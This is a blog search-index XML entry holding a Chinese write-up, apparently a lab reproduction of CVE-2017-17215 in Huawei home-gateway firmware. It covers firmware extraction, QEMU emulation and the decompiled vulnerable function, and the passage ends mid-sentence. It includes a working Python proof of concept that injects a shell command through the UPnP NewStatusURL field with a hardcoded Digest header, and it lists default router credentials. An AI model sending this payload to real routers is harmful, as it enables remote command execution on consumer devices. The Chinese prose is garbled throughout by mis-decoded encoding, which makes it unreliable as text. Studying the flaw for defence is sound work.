<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2017-17215å¤ç°</title>
    <link href="/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡é¦–å‘äºåˆå¤©ç½‘å®‰å®éªŒå®¤ï¼Œé“¾æ¥æ—¶é—´å¤ªä¹…å¿˜äº†ã€‚</p></blockquote><p>ğŸ˜ˆè¿œå¤æ—¶æœŸå­¦ä¹ è·¯ç”±å™¨å›ºä»¶åˆ†æï¼Œå¹¶å°è¯•å¤ç°äº†ä¸€ä¸ªç®€å•çš„CVEã€‚ä¸­é—´é‡åˆ°äº†å¾ˆå¤šçš„å‘ç‚¹ï¼Œè™½ç„¶æŠŠæ¼æ´å¤ç°äº†ï¼Œä½†æ˜¯è¿‡ç¨‹å¯è°“æ›²æŠ˜ã€‚</p><p>psï¼šè¯¥æ–‡ç« ä»¥å¤ç°CVE-2017-17215ä¸ºåŸºç¡€ï¼Œæä¾›ä¸€ä¸ªè¯¦ç»†çš„å›ºä»¶åˆ†æå…¥é—¨æ‰‹å†Œã€‚</p><h2 id="0x01-ç¯å¢ƒå‡†å¤‡"><a class="header-anchor" href="#0x01-ç¯å¢ƒå‡†å¤‡">Â¶</a>0x01 ç¯å¢ƒå‡†å¤‡</h2><p>ç¯å¢ƒå‡†å¤‡æ˜¯åˆ†æå›ºä»¶çš„åŸºç¡€ã€‚æ‰‹é‡Œçš„ç¯å¢ƒæ˜¯ubuntu20ï¼Œä¸­é—´ä¹Ÿå°è¯•è¿‡è¿‡kali2020ã€‚<strong>æœŸé—´å°è¯•è¿‡è‡ªåŠ¨åŒ–å·¥å…·Firmadyneï¼Œä»¥åŠå…¶plusç‰ˆæœ¬</strong>ï¼Œä½†æ˜¯éƒ½å¤±è´¥äº†ï¼Œè¿™é‡Œä¸€äº›å¸ˆå‚…é‚£é‡Œå¾—åˆ°å»ºè®®ï¼ŒFirmadyneå·¥å…·çš„é•œåƒå’Œå†…æ ¸å¤ªè€äº†ï¼Œå»ºè®®æ‰‹åŠ¨æ¢æ–°çš„ï¼Œæ­¤å¤–è¯¥è‡ªåŠ¨åŒ–åˆ†æå·¥å…·å…¶å®ä¹Ÿæœ‰è¾ƒå¤§çš„å±€é™æ€§ï¼Œæ‰€ä»¥æˆ‘å»ºè®®<strong>æ‰‹åŠ¨é…ç½®ä¸€ä¸ªå›ºä»¶æ¨¡æ‹Ÿç¯å¢ƒååˆ†æœ‰å¿…è¦</strong></p><p>ä¸‹é¢æ˜¯ç¯å¢ƒçš„é…ç½®è¿‡ç¨‹ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ubuntu20 python2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="Binwalkå®‰è£…"><a class="header-anchor" href="#Binwalkå®‰è£…">Â¶</a>Binwalkå®‰è£…</h3><p>Binwalkæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„å›ºä»¶æå–å·¥å…·ï¼Œæˆ‘ä»¬æ‹¿åˆ°æ‰‹çš„ï¼Œéœ€è¦åˆ†æçš„å›ºä»¶å¤§éƒ½æ˜¯binæ–‡ä»¶ï¼Œè¿™æ—¶å€™BInwalkå·¥å…·å°±èµ·åˆ°äº†ä»ä¸­åˆ†æå‡ºæ–‡ä»¶ç³»ç»Ÿçš„ä½œç”¨ã€‚</p><p><strong>aptä¸‹è½½çš„å’Œkaliè‡ªå¸¦çš„Binwalk</strong>ç¼ºå°‘éƒ¨åˆ†é‡è¦çš„åˆ†ææ’ä»¶ï¼Œå»ºè®®æ‰‹åŠ¨ç¼–è¯‘å®‰è£…ï¼Œé¿å…å›ºä»¶åˆ†æå¤±è´¥ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove binwalk  //å¦‚æœæœ‰çš„è¯ï¼Œå…ˆåˆ é™¤æ—§ç‰ˆçš„Binwalk<span class="token function">git</span> clone https://github.com/devttys0/binwalk //ä»gitä¸Šè·å–binwalk<span class="token builtin class-name">cd</span> binwalk<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span> //Binwalkä½¿ç”¨python3ç¼–è¯‘å®‰è£…//å¦‚æœæ˜¯python2ç¯å¢ƒï¼Œå°±éœ€è¦å…ˆå®‰è£…ä»¥ä¸‹ä¾èµ–<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-lzma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å¦‚æœgitå‡ºç°é—®é¢˜å¯ä»¥å°è¯•æŠŠ<code>https://</code>æ”¹æˆ<code>git://</code>ï¼Œç­‰å¾…ç¼–è¯‘å®Œæ¯•å³å¯å®ŒæˆBinwalkçš„å®‰è£…ã€‚</p><p>ç„¶åå®‰è£…ä¸€äº›å…¶ä»–çš„ä¾èµ–ã€‚<br>Binwalk uses the pycrypto library to decrypt some known encrypted firmware images:<br>Binwalkæä¾›åˆ†æä¸€äº›åŠ å¯†å›ºä»¶çš„æ’ä»¶ï¼Œä½†æ˜¯ç”¨åˆ°äº†pycryptoåº“ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦å†å®‰è£…ä¸€ä¸‹è¯¥åº“ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-crypto<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-crypto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Binwalkæä¾›å›¾ç‰‡å’Œè§†è§‰åˆ†æã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> pyqtgraph <span class="token comment"># Python3.x</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy python3-pip<span class="token function">sudo</span> pip3 <span class="token function">install</span> pyqtgraph<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Capstone disassembly frameworkçš„æ’ä»¶è¿è¡Œéœ€è¦çš„pythonæ¨¡å—å¦‚ä¸‹ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> capstone<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pip<span class="token comment"># Install standard extraction utilitie</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mtd-utils <span class="token function">gzip</span> <span class="token function">bzip2</span> <span class="token function">tar</span> arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools<span class="token comment"># Install sasquatch to extract non-standard SquashFS image</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> zlib1g-dev liblzma-dev liblzo2-dev  $ <span class="token function">git</span> clone https://github.com/devttys0/sasquatch  $ <span class="token punctuation">(</span>cd sasquatch <span class="token operator">&amp;&amp;</span> ./build.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä»¥ä¸‹çš„é€‰æ‹©æ€§å®‰è£…å³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Install jefferson to extract JFFS2 file systems</span>$ <span class="token function">sudo</span> pip <span class="token function">install</span> cstruct$ <span class="token function">git</span> clone https://github.com/sviehb/jefferson$ <span class="token punctuation">(</span>cd jefferson <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install ubi_reader to extract UBIFS file systems</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> liblzo2-dev python-lzo$ <span class="token function">git</span> clone https://github.com/jrspruitt/ubi_reader$ <span class="token punctuation">(</span>cd ubi_reader <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install yaffshiv to extract YAFFS file systems</span>$ <span class="token function">git</span> clone https://github.com/devttys0/yaffshiv$ <span class="token punctuation">(</span>cd yaffshiv <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install unstuff (closed source) to extract StuffIt archive files</span>$ <span class="token function">wget</span> -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz <span class="token operator">|</span> <span class="token function">tar</span> -zxv$ <span class="token function">sudo</span> <span class="token function">cp</span> bin/unstuff /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä»¥ä¸Šæ˜¯æ‰‹åŠ¨å®‰è£…æ‰€æœ‰åº“çš„è¿‡ç¨‹ï¼Œå¦‚æœæƒ³è¦çœæ—¶é—´ï¼Œä¹Ÿå¯ä»¥å°è¯•ä¸€ä¸‹Binwalkçš„å®‰è£…æ–‡ä»¶å¤¹ä¸­çš„è‡ªåŠ¨å®‰è£…è„šæœ¬ï¼Œ<code>sudo ./deps.sh</code>ï¼Œä½†æ˜¯è¿™æ ·çš„å®‰è£…è€—æ—¶è¾ƒé•¿ï¼Œä¸”å®¹æ˜“æŠ¥é”™ï¼Œå»ºè®®è¿˜æ˜¯é‡‡ç”¨æ‰‹åŠ¨å®‰è£…éœ€è¦çš„å‡ ä¸ªä¾èµ–å³å¯ã€‚</p><p>å®‰è£…å¥½äº†ä¹‹åï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹åˆ†æå›ºä»¶ã€‚<br><code>binwalk -Me å›ºä»¶</code><br><img src="https://i.bmp.ovh/imgs/2022/01/7ad77b1b981aee35.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/20586cf2af94373f.png" alt=""></p><p>åœ¨å½“å‰çš„æ–‡ä»¶å¤¹ä¸‹å³å¯å¾—åˆ°æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ã€‚<br>é€šè¿‡<code>file ./bin/busybox</code>çš„æŒ‡ä»¤å³å¯å¾—åˆ°ç›¸åº”çš„æ–‡ä»¶æ¶æ„ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> ./bin/busybox./bin/busybox: ELF <span class="token number">32</span>-bit MSB executable, MIPS, MIPS32 rel2 version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>è‡³æ­¤Binwalkå®‰è£…å®Œæ¯•ã€‚</p><h3 id="Qemuå®‰è£…"><a class="header-anchor" href="#Qemuå®‰è£…">Â¶</a>Qemuå®‰è£…</h3><p>ç›¸å¯¹äºBinwalkçš„æ‰‹åŠ¨ç¼–è¯‘ï¼ŒQemuç›¸å¯¹ç®€å•ä¸€ç‚¹ï¼Œç¨å¾®æœ‰æ‰€äº†è§£çš„åŒå¿—å¯èƒ½ä¼šçŸ¥é“Qemuæœ‰ç³»ç»Ÿå’Œç”¨æˆ·æ¨¡å¼ä¸¤ç§ã€‚å®‰è£…çš„è¯å¯ä»¥é€‰æ‹©ä¸åŒçš„éœ€æ±‚å®‰è£…ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©å…¨éƒ¨éƒ½å®‰è£…ã€‚</p><p>Qemuçš„å®‰è£…æ²¡æœ‰å¾ˆå¤šè®²ç©¶ï¼Œä¸€é”®è„šæœ¬å®‰è£…å³å¯</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git://git.qemu.org/qemu.git<span class="token builtin class-name">cd</span> qemu<span class="token function">git</span> submodule init<span class="token function">git</span> submodule update --recursivesudo<span class="token function">apt</span> <span class="token function">install</span> libglib2.0 libglib2.0-devsudo<span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtoolcd qemu <span class="token operator">&amp;&amp;</span> ./configuremakesudo <span class="token function">make</span> <span class="token function">install</span>//apt å®‰è£…<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user-static<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å®‰è£…å®Œæ¯•ä¹‹åï¼Œå¦‚ä¸‹å›¾<br><img src="https://i.bmp.ovh/imgs/2022/01/d4c999e08069c699.png" alt=""></p><h2 id="0x02-æ¼æ´éªŒè¯"><a class="header-anchor" href="#0x02-æ¼æ´éªŒè¯">Â¶</a>0x02 æ¼æ´éªŒè¯</h2><p>å·¥å…·å®‰è£…å®Œæ¯•ä¹‹åï¼Œä»¥ä¸‹å°†å¯¹æ¼æ´è¿›è¡ŒéªŒè¯ã€‚</p><h3 id="å¯åŠ¨æœåŠ¡"><a class="header-anchor" href="#å¯åŠ¨æœåŠ¡">Â¶</a>å¯åŠ¨æœåŠ¡</h3><p>é¦–å…ˆï¼Œéœ€è¦ç»™Qemuè™šæ‹Ÿæœºå‡†å¤‡ä¸€ä¸ªæ–°çš„ç½‘æ¡¥ï¼Œåˆ©ç”¨è¯¥ç½‘æ¡¥ä½¿å¾—Qemuæœºå¯ä»¥è”é€šäº’è”ç½‘ï¼Œå¹¶ä¸”å’ŒVMè™šæ‹Ÿæœºå¤„äºåŒä¸€ç½‘æ®µã€‚</p><p>é‡‡ç”¨çš„åŸºæœ¬æ–¹æ³•æ˜¯åˆ†é…ä¸€ä¸ªæ–°ç½‘å¡ç»™Qemuæœºå™¨ï¼Œå¹¶ä¸”ä½¿ç”¨ç½‘æ¡¥ï¼Œå°†å…¶æ¡¥æ¥åˆ°åŸæ¥çš„ç½‘å¡ã€‚é¦–å…ˆéœ€è¦å®‰è£…ç½‘æ¡¥é…ç½®å·¥å…·ã€‚</p><p><code>apt-get install bridge-utils</code><br><code>sudo apt-get install uml-utilities </code></p><p>ç„¶åä½¿ç”¨ä¸‹é¢çš„è„šæœ¬å³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span><span class="token function">sudo</span> brctl addbr br0 //åˆ›å»ºç½‘æ¡¥br0<span class="token function">sudo</span> brctl addif br0 ens33 //è¿æ¥åˆ°ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> <span class="token function">ifconfig</span> ens33 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> dhclient br0//ç»™è¯¥ç½‘æ¡¥åˆ†é…IPåœ°å€ï¼Œæ­¤å‰ä¸èƒ½ç»™ens33åˆ†é…ipv4çš„åœ°å€<span class="token function">sudo</span> tunctl -t tap0 -u root<span class="token function">sudo</span> brctl addif br0 tap0<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> brctl showstp br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>ä»¥ä¸Šå†…å®¹ä¿å­˜åˆ°ä¸€ä¸ªbashè„šæœ¬å³å¯ï¼Œå¼€å¯è™šæ‹Ÿæœºä¹‹å‰è¿è¡Œä¸€éã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/17975a3eca5dd634.png" alt=""></p><p>ç½‘ç»œé…ç½®å¥½äº†ä¹‹åï¼Œä½¿ç”¨ç›¸åº”çš„é•œåƒå’Œå†…æ ¸æ–‡ä»¶å¯åŠ¨ä¸€ä¸ªqemuæœºã€‚<br><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a><br>ä»¥ä¸Šç½‘å€å¯ä»¥ä¸‹è½½å†…æ ¸å’Œé•œåƒã€‚</p><p>æœŸå¾…ä½¿ç”¨æŒ‡å®šçš„ç½‘æ¡¥ï¼Œä¸”åœ¨å½“å‰ä¸­æ–­å¼€å¯qemuæœºå™¨ã€‚<br><code>sudo qemu-system-mips -M malta -kernel ~/Desktop/IOT/vmlinuxs/vmlinux-2.6.32-5-4kc-malta -hda ~/Desktop/IOT/Images/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</code></p><p>æŒ‡ä»¤çš„å…·ä½“å«ä¹‰å¯ä»¥çœ‹ä»¥ä¸‹Qemuçš„è¯´æ˜æ–‡æ¡£ã€‚<a href="https://wiki.archlinux.org/title/QEMU_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/title/QEMU_(ç®€ä½“ä¸­æ–‡)</a></p><p>è™šæ‹Ÿæœºçš„rootè´¦æˆ·å¯†ç æ˜¯rootï¼ŒæˆåŠŸç™»å½•ä¹‹åï¼Œå°è¯•pingä»¥ä¸‹å¤–ç½‘ï¼Œçœ‹èƒ½å¦pingé€šã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/2b3815aba7ca25ec.png" alt=""></p><p>ç„¶åä½¿ç”¨scpæŒ‡ä»¤ï¼ŒæŠŠæ–‡ä»¶ç³»ç»Ÿéƒ½ä¼ é€’ç»™Qemuè™šæ‹Ÿæœºã€‚<br><code>scp -r è·¯å¾„ ip@username:è™šæ‹Ÿæœºè·¯å¾„</code><br><code>$ scp -r squashfs-root  root@192.168.146.137:~/sqashfs-root</code></p><p>æ–‡ä»¶ä¼ è¾“å®Œæ¯•ä¹‹åï¼Œä¸ºäº†èƒ½å¤Ÿè®©VMæœºè®¿é—®åˆ°Qemuæœºï¼Œä½¿ç”¨mountæŒ‚è½½ä»¥ä¸‹devå’Œproc</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> -o <span class="token builtin class-name">bind</span> /dev ./squashfs-root/dev<span class="token function">mount</span> -t proc /proc ./squashfs-root/proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿæœ‰ä¸åŒçš„æŒ‚è½½æŒ‡ä»¤ã€‚</p><p>æ­¤æ—¶æ³¨æ„åˆ°<code>CVE-2017-17215</code>çš„æ¼æ´å­˜åœ¨äº<code>upnpå’Œmic</code>æœåŠ¡ä¸­ã€‚è¿™ä¸¤é¡¹æœåŠ¡éƒ½å’Œç½‘ç»œæœ‰å…³ï¼Œä¸ºäº†æ–¹å¼æ¼æ´æœåŠ¡å¯åŠ¨åï¼Œç½‘ç»œç¯å¢ƒçš„å˜åŒ–ï¼Œä½¿ç”¨sshè¿œç¨‹ç™»å½•è¯¥Qemuæœºå™¨ï¼Œæ–°å»ºä¸€ä¸ªconsoleï¼Œåˆ©ç”¨è¯¥consoleå¯åŠ¨æ¼æ´æœåŠ¡ï¼Œåˆ©ç”¨åŸæœ‰çš„Qemuçª—å£ä¿æŒQemuçš„ipä¸å‘ç”Ÿæ”¹å˜ã€‚</p><p>åœ¨sshçª—å£è¾“å…¥<code>chroot . /bin/sh</code>æ›´æ”¹æ ¹ç›®å½•ï¼Œé¿å…åŠ¨æ€é“¾æ¥åº“æŠ¥é”™ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/b47cbc250d9e899d.png" alt=""></p><p>ç„¶åæ‰§è¡Œæ¼æ´æœåŠ¡å³å¯ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ./bin/upnp</span><span class="token comment"># ./bin/mic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>ç­‰å¾…æ‰§è¡Œç»“æŸï¼Œæœç„¶ipå‘ç”Ÿäº†æ”¹å˜ï¼Œåˆ©ç”¨ifconfigæŒ‡ä»¤æŠŠipåœ°å€æ”¹å›å»ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/a4a0a7d9ee1cb49f.png" alt=""></p><p>æ­¤æ—¶ï¼Œå°è¯•è®¿é—®è¯¥è·¯ç”±å™¨ï¼ˆQemuæœºï¼‰çš„ipåœ°å€ï¼Œå¯ä»¥å‘ç°æˆåŠŸè®¿é—®ã€‚<br><img src="https://i.bmp.ovh/imgs/2022/01/f329dee4d718e098.png" alt=""></p><p>é»˜è®¤è´¦æˆ·adminï¼Œ@Hua1234</p><h3 id="pocæµ‹è¯•"><a class="header-anchor" href="#pocæµ‹è¯•">Â¶</a>pocæµ‹è¯•</h3><p>æ¼æ´æœåŠ¡å¼€å¯ä¹‹åï¼Œå¯ä»¥éªŒè¯ä»¥ä¸‹æ¼æ´çš„pocï¼Œç”¨çš„æ˜¯ä¸‹é¢çš„exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?xml version="1.0" ?> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  &lt;s:Body>&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">   &lt;NewStatusURL>;/bin/busybox mkdir shell;&lt;/NewStatusURL>   &lt;NewDownloadURL>HUAWEIUPNP&lt;/NewDownloadURL>  &lt;/u:Upgrade> &lt;/s:Body>&lt;/s:Envelope>'''</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.146.137:37215/ctrlt/DeviceUpgrade_1'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>postè¯·æ±‚çš„IPåœ°å€å†™Qemuæœºçš„IPåœ°å€ã€‚æ‰§è¡Œåï¼Œç»“æœå¦‚ä¸‹ï¼š<br><img src="https://i.bmp.ovh/imgs/2022/01/ce55e82d38946b38.png" alt=""><br>æˆåŠŸrceã€‚</p><h2 id="0x03-æ¼æ´åˆ†æ"><a class="header-anchor" href="#0x03-æ¼æ´åˆ†æ">Â¶</a>0x03 æ¼æ´åˆ†æ</h2><p>æ¼æ´ç¯å¢ƒå’ŒæœåŠ¡éƒ½å·²æ­å»ºæˆåŠŸï¼Œå¹¶ä¸”å·²ç»æˆåŠŸéªŒè¯ã€‚æ¥ä¸‹æ¥ç»“åˆå›ºä»¶åˆ†ææ›´åŠ æ·±å…¥ç†è§£è¯¥æ¼æ´çš„æˆå› ã€‚</p><h3 id="åˆ†ææ¼æ´å‡½æ•°"><a class="header-anchor" href="#åˆ†ææ¼æ´å‡½æ•°">Â¶</a>åˆ†ææ¼æ´å‡½æ•°</h3><p>é¦–å…ˆï¼Œä½¿ç”¨Ghidraæ‰“å¼€upnpæ–‡ä»¶ã€‚ç”±pocä¸éš¾å‘ç°ï¼Œæ³¨å…¥å‘½ä»¤çš„ä½ç½®å‡ºç°åœ¨<code>&lt;NewStatusURL&gt;</code>èŠ‚ç‚¹ä»¥å†…ã€‚æ‰€ä»¥å…ˆå°è¯•æœç´¢è¯¥å­—ç¬¦ä¸²ã€‚</p><p>åœ¨å­—ç¬¦ä¸²æœç´¢æ¡†æœç´¢ï¼Œ<code>NewStatusURL</code>,çš„åˆ°å¦‚ä¸‹å‡½æ•°ã€‚</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0040749c</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_418<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_414<span class="token punctuation">;</span>  <span class="token keyword">char</span> acStack1040 <span class="token punctuation">[</span><span class="token number">1028</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewDownloadURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_418<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_418 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>     <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span>                        <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewStatusURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_414<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_414 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">snprintf</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b"</span><span class="token punctuation">,</span>               local_418<span class="token punctuation">,</span>local_414<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>å®¹æ˜“å‘ç°systemå‡½æ•°çš„å‚æ•°æ¥æºäº<code>snprintf</code>ï¼Œå†çœ‹snprintfå‡½æ•°ä¸­ï¼Œå‚æ•°çš„æ‹¼æ¥ç”¨çš„æ˜¯å­—ç¬¦ä¸²<code>%s</code>ä¼ å…¥ï¼Œæ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤å¤„ç†ï¼Œç”±æ­¤å¯ä»¥åˆ¤æ–­ï¼Œè¿™æ˜¯ç”±<code>snprintf</code>å‚æ•°è¿‡æ»¤ä¸ä¸¥æ 